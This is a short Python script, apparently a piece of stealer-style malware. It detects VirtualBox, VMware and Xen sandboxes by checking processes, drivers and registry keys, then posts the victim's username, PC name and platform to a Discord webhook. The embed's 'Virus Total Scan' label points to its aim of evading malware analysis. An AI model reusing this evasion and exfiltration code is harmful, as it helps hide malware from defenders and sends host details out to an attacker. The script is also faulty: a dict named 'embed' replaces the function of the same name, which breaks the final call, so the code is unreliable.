import requests
import os
import subprocess
import sys
import platform
import winreg

webhook = "webhook here" 


def embed(embed):
    payload = {"embeds": [embed]}
    response = requests.post(webhook, json=payload)
    if response.status_code != 200:
        pass

def cvm():
    vm_processes = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "vmacthlp.exe", "vmsrvc.exe", "xenservice.exe"]
    vm_drivers = ["VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys", "vmhgfs.sys", "vmxnet.sys", "vmmouse.sys", "vmci.sys", "vmx_svga.sys"]
    detected_processes = [proc for proc in vm_processes if proc.lower() in os.popen("tasklist").read().lower()]
    detected_drivers = [driver for driver in vm_drivers if os.path.exists(f"C:\\Windows\\System32\\drivers\\{driver}")]
    return detected_processes, detected_drivers

def check_registry_key(key):
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key) as reg_key:
            return True
    except FileNotFoundError:
        return False
    except Exception as e:
        print(e)
        return False

pc_username = os.getlogin()
pc_name = platform.node()
platform_name = platform.system()
detected_processes, detected_driver = cvm()
embed = {
    "title": pc_username,
    "color": 0x000000,
    "author": {
        "name": "Virtual Machine Detected / Virus Total Scan ",
        "icon_url": "https://img.icons8.com/pastel-glyph/64/security-checked--v1.png"
    },
    "footer": {
        "text": "VM Protection | https://github.com/resentful1"
    },
    "fields": [
        {"name": "PC Information", "value": f"<a:egptick:798084594552537099> PC Name: `{pc_name}`\n<a:egptick:798084594552537099> Username: `{pc_username}`\n<a:egptick:798084594552537099> Platform: `{platform_name}`", "inline": False},
        {"name": "Virtual Machine", "value": "True", "inline": False},
        {"name": "Detected Processes", "value": "\n".join(detected_processes) if detected_processes else "None", "inline": False},
        {"name": "Detected Drivers", "value": "\n".join(detected_driver) if detected_driver else "None", "inline": False}
    ]
}
embed(embed)